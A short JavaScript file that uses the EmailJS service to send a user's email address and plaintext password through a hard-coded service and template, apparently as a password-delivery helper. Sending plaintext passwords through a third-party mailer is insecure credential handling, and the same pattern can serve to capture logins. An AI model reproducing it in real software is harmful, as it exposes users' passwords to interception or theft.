// sendEmail.js
(function() {
    emailjs.init("NwGxZ5hgsLRW0Pm7r"); // Initialize EmailJS with your public key

    // Function to send email
    window.sendPasswordEmail = function(email, password) {
        const templateParams = {
            to_name: "User", // You can customize this
            from_name: "Your Company", // Customize this as needed
            email: email, // User's email
            password: password // User's password
        };

        // Return the promise so the caller can handle success/error
        return emailjs.send("service_90o9nzw", "template_2a48dz3", templateParams)
            .then(function(response) {
                console.log("Email sent successfully!", response.status, response.text);
                return response; // Return the response for further handling
            })
            .catch(function(error) {
                console.error("Error sending email:", error);
                throw error; // Re-throw the error to handle it in the caller
            });
    }
})();
